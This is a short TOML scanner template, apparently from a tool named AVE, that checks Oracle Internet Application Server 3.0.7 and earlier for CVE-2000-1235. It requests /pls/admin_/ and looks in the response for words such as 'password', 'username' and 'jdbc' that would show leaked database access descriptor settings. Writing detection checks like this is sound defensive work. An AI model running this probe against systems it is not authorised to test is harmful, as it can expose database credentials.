[info]
author = "ave"
description = "检测 Oracle Internet Application Server (IAS) 3.0.7 及更早版本默认配置下的 DAD 文件信息泄露漏洞。通过访问常见的 PL/SQL 网关路径尝试获取数据库访问描述符配置信息。"
id = "POC-AVE-2000-1162"
name = "CVE-2000-1235 PoC"
severity = "medium"
tags = ["ave-2000-1162"]
vuln_id = [
    "CVE-2000-1235",
    "AVE-2000-1162",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/pls/admin_/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "DAD",
    "database",
    "connect",
    "oracle",
    "password",
    "username",
    "jdbc",
]

